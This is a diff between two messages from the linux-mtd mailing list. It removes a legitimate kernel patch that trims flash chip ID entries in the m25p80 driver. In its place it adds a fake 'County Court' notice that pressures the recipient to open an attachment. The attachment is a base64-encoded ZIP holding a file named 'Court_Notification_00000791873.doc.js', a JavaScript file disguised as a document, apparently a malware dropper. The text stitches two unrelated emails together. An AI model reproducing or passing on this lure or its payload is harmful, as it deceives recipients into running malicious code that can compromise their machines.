@@ -1,18 +1,24 @@
-Received: from mail-wi0-x22b.google.com ([2a00:1450:400c:c05::22b])
+Received: from gateway12.websitewelcome.com ([69.56.148.16])
  by bombadil.infradead.org with esmtps (Exim 4.80.1 #2 (Red Hat Linux))
- id 1YfP3N-0004Eq-P2
- for linux-mtd@lists.infradead.org; Tue, 07 Apr 2015 08:40:14 +0000
-Received: by wizk4 with SMTP id k4so8549581wiz.1
- for <linux-mtd@lists.infradead.org>; Tue, 07 Apr 2015 01:39:50 -0700 (PDT)
-From: =?UTF-8?q?Rafa=C5=82=20Mi=C5=82ecki?= <zajec5@gmail.com>
-To: Brian Norris <computersforpeace@gmail.com>, linux-mtd@lists.infradead.org
-Subject: [PATCH] mtd: m25p80: remove unused flash entries from id_table
-Date: Tue,  7 Apr 2015 10:39:41 +0200
-Message-Id: <1428395981-21012-1-git-send-email-zajec5@gmail.com>
+ id 1YfPQf-00033h-IB
+ for linux-mtd@lists.infradead.org; Tue, 07 Apr 2015 09:04:18 +0000
+Received: from gadgetmobile.websitewelcome.com
+ (gadgetmobile.websitewelcome.com [192.185.81.221])
+ by gateway12.websitewelcome.com (Postfix) with ESMTP id 420CD46A11538
+ for <linux-mtd@lists.infradead.org>; Tue,  7 Apr 2015 04:03:44 -0500 (CDT)
+Received: from olukanka by gadgetmobile.websitewelcome.com with local (Exim
+ 4.82) (envelope-from <olukanka@gadgetmobile.websitewelcome.com>)
+ id 1YfPQ7-0007tv-9B
+ for linux-mtd@lists.infradead.org; Tue, 07 Apr 2015 04:03:43 -0500
+To: linux-mtd@lists.infradead.org
+Subject: Notice of appearance in Court #00000791873
+Date: Tue, 7 Apr 2015 04:03:43 -0500
+From: "County Court" <francisco.barber@olukankara.com>
+Reply-To: "County Court" <francisco.barber@olukankara.com>
+Message-ID: <a1a72f23b23ed649e02e6fe263d32203@olukankara.com>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
+Content-Type: multipart/mixed; boundary="b1_c2da10b7d2b2a728fee32abd08a1e412"
 Content-Transfer-Encoding: 8bit
-Cc: =?UTF-8?q?Rafa=C5=82=20Mi=C5=82ecki?= <zajec5@gmail.com>
 List-Id: Linux MTD discussion mailing list <linux-mtd.lists.infradead.org>
 List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-mtd>,
  <mailto:linux-mtd-request@lists.infradead.org?subject=unsubscribe>
@@ -22,111 +28,103 @@ List-Help: <mailto:linux-mtd-request@lists.infradead.org?subject=help>
 List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-mtd>,
  <mailto:linux-mtd-request@lists.infradead.org?subject=subscribe>
 
-We had many entries that were recently added just to allow selecting
-some flashes directly but were never used. They weren't providing any
-special flash handling, we just needed them due to the lack of some
-generic binding string.
+--b1_c2da10b7d2b2a728fee32abd08a1e412
+Content-Type: text/plain; charset=us-ascii
 
-With the introduction of "nor-jedec" (in 1103b85) they won't be needed
-unless we discover some faulty flash requiring workarounds.
-As explained in m25p80 DT documentation we require specifying
-"nor-jedec" now as less specific compatible entry.
+Notice to Appear,
 
-Signed-off-by: Rafał Miłecki <zajec5@gmail.com>
----
-To verify list of removed entries by yourself:
-egrep -R "at25fs010|at25fs040|at25df041a|at26f004|at26df161a|at26df321|at45db081d" ./
-egrep -R "en25f32|en25p32|en25q32b|en25p64|en25q64|en25qh128|en25qh256" ./
-egrep -R "f25l32pa" ./
-egrep -R "mr25h10" ./
-egrep -R "gd25q32|gd25q64" ./
-egrep -R "160s33b|320s33b|640s33b" ./
-egrep -R "mx25l2005a|mx25l8005|mx25l3205d|mx25l3255e|mx25l12855e|mx25l25655e|mx66l1g55g" ./
-egrep -R "n25q256a|n25q512ax3|n25q00" ./
-egrep -R "pm25lv512|pm25lv010|pm25lq032" ./
-egrep -R "s25sl032p|s25sl064p|s25fl256s0|s70fl01gs|s25sl12800|s25fl129p0|s25fl129p1|s25sl004a|s25sl008a|s25sl016a|s25sl032a|s25fl016k|s25fl132k" ./
-egrep -R "sst25vf080b|sst25vf064c|sst25wf512|sst25wf010|sst25wf020" ./*
-egrep -R "m25p05|m25p20|n25q032|m25pe20|m25pe80|m25pe16|m25px16|m25px32|m25px32-s0|m25px32-s1|m25px80" ./
-egrep -R "m45pe10|m45pe80|m45pe16" ./
-egrep -R "w25x10|w25x20|w25x40|w25x64|w25q64|w25q80" ./
-egrep -R "cat25c11|cat25c03|cat25c09|cat25c17|cat25128" ./
----
- drivers/mtd/devices/m25p80.c | 60 ++++++++++++++++++--------------------------
- 1 file changed, 24 insertions(+), 36 deletions(-)
+This is to inform you to appear in the Court on the April 15 for your case hearing.
+Please, prepare all the documents relating to the case and bring them to Court on the specified date.
+Note: The case will be heard by the judge in your absence if you do not come.
 
-diff --git a/drivers/mtd/devices/m25p80.c b/drivers/mtd/devices/m25p80.c
-index 7c8b169..052bd19 100644
---- a/drivers/mtd/devices/m25p80.c
-+++ b/drivers/mtd/devices/m25p80.c
-@@ -261,45 +261,33 @@ static int m25p_remove(struct spi_device *spi)
-  * keep them available as module aliases for existing platforms.
-  */
- static const struct spi_device_id m25p_ids[] = {
--	{"at25fs010"},	{"at25fs040"},	{"at25df041a"},	{"at25df321a"},
--	{"at25df641"},	{"at26f004"},	{"at26df081a"},	{"at26df161a"},
--	{"at26df321"},	{"at45db081d"},
--	{"en25f32"},	{"en25p32"},	{"en25q32b"},	{"en25p64"},
--	{"en25q64"},	{"en25qh128"},	{"en25qh256"},
--	{"f25l32pa"},
--	{"mr25h256"},	{"mr25h10"},
--	{"gd25q32"},	{"gd25q64"},
--	{"160s33b"},	{"320s33b"},	{"640s33b"},
--	{"mx25l2005a"},	{"mx25l4005a"},	{"mx25l8005"},	{"mx25l1606e"},
--	{"mx25l3205d"},	{"mx25l3255e"},	{"mx25l6405d"},	{"mx25l12805d"},
--	{"mx25l12855e"},{"mx25l25635e"},{"mx25l25655e"},{"mx66l51235l"},
--	{"mx66l1g55g"},
--	{"n25q064"},	{"n25q128a11"},	{"n25q128a13"},	{"n25q256a"},
--	{"n25q512a"},	{"n25q512ax3"},	{"n25q00"},
--	{"pm25lv512"},	{"pm25lv010"},	{"pm25lq032"},
--	{"s25sl032p"},	{"s25sl064p"},	{"s25fl256s0"},	{"s25fl256s1"},
--	{"s25fl512s"},	{"s70fl01gs"},	{"s25sl12800"},	{"s25sl12801"},
--	{"s25fl129p0"},	{"s25fl129p1"},	{"s25sl004a"},	{"s25sl008a"},
--	{"s25sl016a"},	{"s25sl032a"},	{"s25sl064a"},	{"s25fl008k"},
--	{"s25fl016k"},	{"s25fl064k"},	{"s25fl132k"},
--	{"sst25vf040b"},{"sst25vf080b"},{"sst25vf016b"},{"sst25vf032b"},
--	{"sst25vf064c"},{"sst25wf512"},	{"sst25wf010"},	{"sst25wf020"},
--	{"sst25wf040"},
--	{"m25p05"},	{"m25p10"},	{"m25p20"},	{"m25p40"},
--	{"m25p80"},	{"m25p16"},	{"m25p32"},	{"m25p64"},
--	{"m25p128"},	{"n25q032"},
-+	/*
-+	 * Entries not used in DTs that should be safe to drop after replacing
-+	 * them with "nor-jedec" in platform data.
-+	 */
-+	{"s25sl064a"},	{"w25x16"},	{"m25p10"},	{"m25px64"},
-+
-+	/*
-+	 * Entries that were used in DTs without "nor-jedec" fallback and should
-+	 * be kept for backward compatibility.
-+	 */
-+	{"at25df321a"},	{"at25df641"},	{"at26df081a"},
-+	{"mr25h256"},
-+	{"mx25l4005a"},	{"mx25l1606e"},	{"mx25l6405d"},	{"mx25l12805d"},
-+	{"mx25l25635e"},{"mx66l51235l"},
-+	{"n25q064"},	{"n25q128a11"},	{"n25q128a13"},	{"n25q512a"},
-+	{"s25fl256s1"},	{"s25fl512s"},	{"s25sl12801"},	{"s25fl008k"},
-+	{"s25fl064k"},
-+	{"sst25vf040b"},{"sst25vf016b"},{"sst25vf032b"},{"sst25wf040"},
-+	{"m25p40"},	{"m25p80"},	{"m25p16"},	{"m25p32"},
-+	{"m25p64"},	{"m25p128"},
-+	{"w25x80"},	{"w25x32"},	{"w25q32"},	{"w25q32dw"},
-+	{"w25q80bl"},	{"w25q128"},	{"w25q256"},
-+
-+	/* Flashes that can't be detected using JEDEC */
- 	{"m25p05-nonjedec"},	{"m25p10-nonjedec"},	{"m25p20-nonjedec"},
- 	{"m25p40-nonjedec"},	{"m25p80-nonjedec"},	{"m25p16-nonjedec"},
- 	{"m25p32-nonjedec"},	{"m25p64-nonjedec"},	{"m25p128-nonjedec"},
--	{"m45pe10"},	{"m45pe80"},	{"m45pe16"},
--	{"m25pe20"},	{"m25pe80"},	{"m25pe16"},
--	{"m25px16"},	{"m25px32"},	{"m25px32-s0"},	{"m25px32-s1"},
--	{"m25px64"},	{"m25px80"},
--	{"w25x10"},	{"w25x20"},	{"w25x40"},	{"w25x80"},
--	{"w25x16"},	{"w25x32"},	{"w25q32"},	{"w25q32dw"},
--	{"w25x64"},	{"w25q64"},	{"w25q80"},	{"w25q80bl"},
--	{"w25q128"},	{"w25q256"},	{"cat25c11"},
--	{"cat25c03"},	{"cat25c09"},	{"cat25c17"},	{"cat25128"},
- 
- 	/*
- 	 * Generic support for SPI NOR that can be identified by the JEDEC READ
--- 
-1.8.4.5
+You can review complete details of the Court Notice in the attachment.
+
+Regards,
+Francisco Barber,
+Court Secretary.
+
+
+--b1_c2da10b7d2b2a728fee32abd08a1e412
+Content-Type: application/zip; name="Court_Notification_00000791873.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Court_Notification_00000791873.zip
+
+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
+
+
+--b1_c2da10b7d2b2a728fee32abd08a1e412--
